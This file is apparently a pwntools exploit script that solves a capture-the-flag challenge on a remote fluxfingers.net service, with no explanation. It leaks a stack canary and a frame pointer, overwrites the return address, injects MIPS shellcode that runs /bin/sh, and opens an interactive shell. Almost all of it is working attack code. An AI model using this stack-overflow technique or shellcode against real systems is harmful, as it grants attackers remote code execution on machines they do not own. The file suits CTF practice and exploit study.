from pwn import *

shellcode="\x50\x73\x06\x24\xff\xff\xd0\x04\x50\x73\x0f\x24\xff\xff\x06\x28\xe0\xff\xbd\x27\xd7\xff\x0f\x24\x27\x78\xe0\x01\x21\x20\xef\x03\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x23\xab\x0f\x02\x24\x0c\x01\x01\x01/bin/sh\x00"


p = remote('noriscnofuture.forfuture.fluxfingers.net',1338)

#get canary
payload = 'a'*60+'bbbb'+'c'
p.send(payload)
canary = p.recv()
canary = '\x00'+canary[canary.find('bbbbc')+5:canary.find('bbbbc')+5+3]
canary = u32(canary)
info('canary %s'%hex(canary))

#check if canary is correct


#get fp
payload = 'a'*64
payload += 'b'*4 #canary
payload += 'b'*4 #shit
payload += 'a'*4 #return address
payload += 'a'*6*4+'bcde'
print(payload)
p.send(payload)
fp = p.recv()
fp = fp[fp.find('bcde')+4 : fp.find('bcde')+8]
fp = u32(fp)
info("Frame Pointer %s"%hex(fp))

#store shell after return and overwrite return address with frame pointer
payload = 'a'*72
payload +=  p32(fp)# overwrite with fp return address
payload += shellcode
p.send(payload)
print(p.recv())

#write canary
payload = 'a'*64
payload += p32(canary)
for i in range(7):
    p.send(payload)
    p.recv()


p.interactive()
